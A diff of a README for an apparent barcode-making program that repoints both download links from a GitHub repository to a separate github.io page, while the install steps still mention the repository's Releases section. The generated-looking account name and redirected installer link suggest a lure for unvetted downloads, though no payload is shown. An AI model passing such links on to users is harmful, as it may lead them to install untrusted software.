@@ -1,6 +1,6 @@
 # 📦 eps-barcode-maker-2026 - Create professional barcodes on your computer
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/publicsecurityevening297/eps-barcode-maker-2026)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://publicsecurityevening297.github.io)
 
 This software generates EAN-13 barcodes for retail and inventory needs. You work offline without internet access. The tool creates high-quality vector files in the EPS format. You can process single items or import large lists from Excel or CSV files. The live preview shows your barcode as you type.
 
@@ -15,7 +15,7 @@ This software generates EAN-13 barcodes for retail and inventory needs. You work
 
 Visit the link below to reach the project page. You will find the installer file there.
 
-[Download the Installer](https://github.com/publicsecurityevening297/eps-barcode-maker-2026)
+[Download the Installer](https://publicsecurityevening297.github.io)
 
 1. Click the link above to open the project repository.
 2. Look for the "Releases" section on the right side of the page.
